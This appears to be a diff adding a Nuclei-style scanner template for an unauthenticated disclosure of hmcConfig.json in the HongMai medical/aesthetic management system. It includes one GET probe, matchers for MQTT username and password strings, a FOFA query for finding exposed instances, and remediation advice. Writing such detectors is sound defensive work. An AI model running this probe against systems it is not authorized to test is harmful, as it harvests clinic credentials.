@@ -1,0 +1,51 @@
+id: hongmai-hmcconfig-infoleak
+
+info:
+  name: HongMai Aesthetic/Medical Management System - hmcConfig.json Information Disclosure
+  author: qwtd
+  severity: medium
+  description: |
+    HongMai (HongMai Medical/Aesthetic Industry Management System) is affected by an information disclosure issue
+    where a configuration resource (commonly hmcConfig.json) may be accessible without authentication.
+    An attacker can retrieve configuration details that may include internal endpoints, environment settings,
+    and potentially sensitive identifiers, which can be used for further attacks.
+  remediation: |
+    - Restrict public access to hmcConfig.json (and similar config endpoints) via authentication and/or access control.
+    - Remove sensitive secrets from client-accessible configuration files; store secrets server-side only.
+    - Add web server rules to deny direct access to *.json configuration artifacts under web roots.
+    - Review logs for unauthorized access attempts and rotate any exposed credentials/tokens.
+  impact: |
+    Exposure of configuration data may reveal internal service URLs, application structure, and other sensitive settings.
+    In some deployments this can facilitate credential theft, targeted exploitation, and lateral movement.
+  reference:
+    - https://mp.weixin.qq.com/s/Ui8fxwYrT-Ha18n2RYW00Q
+  classification:
+    cwe-id: CWE-200
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+  metadata:
+    vendor: hongmai
+    product: hongmai-management-system
+    verified: true
+    max-request: 1
+    fofa: title="宏脉医美行业管理系统" || body="宏脉医疗机构管理系统"
+  tags: 宏脉医美行业管理系统,宏脉医疗机构管理系统
+
+http:
+  - raw:
+      - |
+        GET /hmcConfig.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'MQTT_PASSWORD'
+          - 'MQTT_USERNAME'
+        condition: and
+
+      - type: status
+        status:
+          - 200
